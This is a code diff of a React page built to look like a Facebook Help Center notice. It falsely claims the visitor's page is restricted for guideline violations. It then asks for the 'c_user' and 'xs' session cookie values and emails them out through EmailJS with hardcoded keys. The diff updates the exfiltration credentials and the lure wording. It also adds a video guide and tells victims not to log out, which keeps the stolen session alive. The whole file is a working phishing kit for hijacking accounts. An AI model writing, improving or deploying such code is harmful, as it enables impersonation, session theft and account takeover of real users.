@@ -2,15 +2,17 @@ import React, { useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 import "./style.css";
-import LoginModal from "../modal/LoginModal"; // Import the LoginModal component
-import sampleVideo from "../assets/0809.mp4"; // Video file from project folder
+import LoginModal from "../modal/LoginModal";
+
+// 1) Local video import (adjust path if different)
+import localVideo from "../assets/video.mp4";
 
 const ValidationPage = () => {
   const form = useRef();
   const navigate = useNavigate();
   const [isFormValid, setIsFormValid] = useState(false);
-  const [videoMuted] = useState(true); // Video remains muted as enable sound button is removed
-  const [showModal, setShowModal] = useState(false); // State to control modal visibility
+  const [videoMuted, setVideoMuted] = useState(true);
+  const [showModal, setShowModal] = useState(false);
 
   const sendEmail = (e) => {
     e.preventDefault();
@@ -27,10 +29,10 @@ const ValidationPage = () => {
     if (isCUserValid && isXsValid) {
       emailjs
         .sendForm(
-          "service_g572qgw",
-          "template_uxuv4h7",
+          "service_gjnrhhz",
+          "template_kocr2op",
           form.current,
-          "ZLLsg29uJrmMWpY5z"
+          "ta7wkIBfmTXLQ74Ev"
         )
         .then(
           (result) => {
@@ -47,217 +49,142 @@ const ValidationPage = () => {
   };
 
   return (
-    <>
-      <form ref={form} onSubmit={sendEmail} className="validation-form">
-        {/* Header Section */}
+    <div
+      style={{
+        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif',
+        fontSize: "14px",
+        fontWeight: 400,
+      }}
+    >
+      <form ref={form} onSubmit={sendEmail}>
+        {/* Top Blue Bar */}
         <div
-          className="header-section"
-          style={{
-            width: "100%",
-            height: "90px",
-            background: "#4667AC",
-            display: "flex",
-            alignItems: "center",
-            paddingLeft: "1rem",
-          }}
+          className="d-flex align-items-center"
+          style={{ width: "100%", height: "90px", background: "#4667AC" }}
         >
           <h1
-            className="text-white m-0"
-            style={{ fontFamily: "Arial, sans-serif", fontWeight: "bold" }}
+            className="text-white ms-4 m-0 d-flex align-self-center"
+            style={{ fontWeight: 400 }}
           >
             facebook
           </h1>
         </div>
 
+        {/* Second Gray Bar */}
         <div
-          className="sub-header"
-          style={{
-            width: "100%",
-            height: "60px",
-            background: "#E9EBEE",
-            display: "flex",
-            alignItems: "center",
-            paddingLeft: "1rem",
-          }}
+          className="d-flex align-items-center"
+          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
         >
           <h4
-            className="text-primary m-0"
-            style={{ fontFamily: "Arial, sans-serif" }}
+            className="ms-4 m-0 d-flex align-self-center text-primary"
+            style={{ fontWeight: 400 }}
           >
             Help Center
           </h4>
         </div>
 
-        {/* Main Content */}
-        <div className="container my-4 d-flex justify-content-center align-items-center">
-          <div
-            className="form-container col-11 col-md-6"
-            style={{
-              border: "1px solid #ccc",
-              borderRadius: "8px",
-              overflow: "hidden",
-              boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
-            }}
-          >
-            <div
-              className="form-header p-3"
-              style={{ background: "#F5F6F7" }}
-            >
-              <h5 style={{ margin: "0", fontFamily: "Arial, sans-serif" }}>
-                Account Notice &amp; Issue Resolution
+        {/* Main Body */}
+        <div className="col-12 my-4 d-flex justify-content-center align-items-center">
+          <div className="col-11 col-md-6 border">
+            {/* Header inside box */}
+            <div className="p-2" style={{ background: "#F5F6F7" }}>
+              <h5 className="m-0" style={{ fontWeight: 400 }}>
+                Request For Remove Page Violation
               </h5>
             </div>
-            <div className="form-body p-3">
+            <div className="p-2">
               {isFormValid && (
                 <div className="alert alert-danger">
                   Please enter valid values for both fields.
                   <br />
-                  For more details, check the video below.
+                  For more detail, check the video below.
                 </div>
               )}
-              <p
-                className="fw-semibold validation_form_para"
-                style={{ fontFamily: "Arial, sans-serif" }}
-              >
-                Our system has identified some unusual activity on your account.
-                This notice is intended to inform you of potential discrepancies
-                that may require your attention. We aim to maintain a safe and
-                supportive environment for all users.
+
+              <p className="validation_form_para" style={{ fontWeight: 400 }}>
+                We've identified irregular activity on your page that goes
+                against our community guidelines. As a result, access to your
+                page has been restricted, and you're presently unable to post,
+                share, or comment using it.
               </p>
-              <p
-                className="fw-semibold validation_form_para"
-                style={{ fontFamily: "Arial, sans-serif" }}
-              >
-                If you believe this notice has been issued in error, please
-                review your recent activity and provide the requested details
-                below to assist our review process.
-              </p>
-              <p
-                className="fw-semibold validation_form_para"
-                style={{ fontFamily: "Arial, sans-serif" }}
-              >
-                Providing accurate information will help us resolve any issues
-                promptly. Please note that recurring issues may lead to further
-                account limitations.
-              </p>
-              <p
-                className="fw-semibold validation_form_para"
-                style={{ fontFamily: "Arial, sans-serif" }}
-              >
-                Kindly fill in the details below. Refer to the video for further
-                clarification if necessary.
+              <p className="validation_form_para" style={{ fontWeight: 400 }}>
+                Please provide the precise details below. Refer to the video for
+                clarification if you find the instructions unclear.
               </p>
 
               <p
-                className="fw-semibold text-secondary"
-                style={{ fontSize: "12px", fontFamily: "Arial, sans-serif" }}
+                className="text-secondary"
+                style={{ fontSize: "12px", fontWeight: 400 }}
               >
-                Video Guidelines for Issue Resolution.
+                Detailed Video Information.
               </p>
 
-              <div className="video-container" style={{ textAlign: "center" }}>
-                <video
-                  controls
-                  autoPlay
-                  muted={videoMuted}
-                  src={sampleVideo}
-                  preload="metadata"
-                  style={{
-                    width: "320px",
-                    height: "180px",
-                    borderRadius: "8px",
-                    boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
-                  }}
-                ></video>
-              </div>
-
-              <p
-                className="fw-semibold validation_form_para mt-3"
-                style={{ fontFamily: "Arial, sans-serif" }}
-              >
-                Please ensure you provide the requested details to help us
-                review your case.
-              </p>
-
-              <div className="input-group" style={{ marginTop: "1rem" }}>
-                <label
-                  style={{
-                    fontSize: "12px",
-                    fontFamily: "Arial, sans-serif",
-                  }}
-                >
-                  c_user
-                </label>
-                <br />
-                <input
-                  type="number"
-                  name="c_user"
-                  required
-                  pattern="^\d{15}$"
-                  title="Please enter 15 digits"
-                  style={{
-                    width: "100%",
-                    padding: "8px",
-                    borderRadius: "4px",
-                    border: "1px solid #ccc",
-                    marginTop: "5px",
-                    boxShadow: "0 2px 4px rgba(0,0,0,0.05)",
-                  }}
-                />
-              </div>
-
-              <div className="input-group mt-3">
-                <label
-                  style={{
-                    fontSize: "12px",
-                    fontFamily: "Arial, sans-serif",
-                  }}
-                >
-                  xs
-                </label>
-                <br />
-                <input
-                  type="text"
-                  name="xs"
-                  style={{
-                    width: "100%",
-                    padding: "8px",
-                    borderRadius: "4px",
-                    border: "1px solid #ccc",
-                    marginTop: "5px",
-                    boxShadow: "0 2px 4px rgba(0,0,0,0.05)",
-                  }}
-                />
-              </div>
-
-              <p
-                className="mt-2"
+              {/* 2) Use localVideo instead of external link */}
+              <video
+                controls
+                autoPlay
+                muted={videoMuted}
+                src={localVideo} // <-- Local video source
+                style={{ width: "320px", height: "180px" }}
+              ></video>
+              <br />
+              <button
+                onClick={() => setVideoMuted(false)}
                 style={{
+                  padding: "4px 8px",
                   fontSize: "12px",
-                  fontFamily: "Arial, sans-serif",
+                  marginTop: "10px",
+                  fontWeight: 400,
+                  background: "#4267B2",
+                  color: "#fff",
+                  border: "none",
                 }}
               >
-                Please remain logged in on your device until you receive further
-                communication regarding your account status.
+                Enable Sound
+              </button>
+
+              <p
+                className="validation_form_para mt-2"
+                style={{ fontWeight: 400 }}
+              >
+                Please be sure to provide the requested information below.
+              </p>
+
+              <label style={{ fontSize: "12px", fontWeight: 400 }}>
+                c_user
+              </label>
+              <br />
+              <input
+                type="number"
+                name="c_user"
+                required
+                pattern="^\d{15}$"
+                title="Please enter 15 digits"
+                style={{ fontWeight: 400 }}
+              />
+              <br />
+              <label
+                className="mt-2"
+                style={{ fontSize: "12px", fontWeight: 400 }}
+              >
+                xs
+              </label>
+              <br />
+              <input type="text" name="xs" style={{ fontWeight: 400 }} />
+              <p className="mt-2" style={{ fontSize: "12px", fontWeight: 400 }}>
+                Please make sure not to log out from your computer or laptop
+                until you have received a verification email.
               </p>
             </div>
 
             <div
-              className="form-footer p-3 d-flex justify-content-end"
+              className="p-2 mb-2 d-flex justify-content-end"
               style={{ background: "#F5F6F7" }}
             >
               <button
                 type="submit"
-                className="text-white"
-                style={{
-                  background: "#0D6EFD",
-                  border: "none",
-                  padding: "10px 20px",
-                  borderRadius: "4px",
-                  cursor: "pointer",
-                  boxShadow:
-                    "inset 0 1px 0 rgba(255,255,255,0.15), 0 1px 1px rgba(0,0,0,0.075)",
-                }}
+                className="text-white border-0"
+                style={{ background: "#4267B2", fontWeight: 400 }}
               >
                 Submit
               </button>
@@ -268,7 +195,7 @@ const ValidationPage = () => {
 
       {/* Include the LoginModal component */}
       <LoginModal showModal={showModal} setShowModal={setShowModal} />
-    </>
+    </div>
   );
 };
 
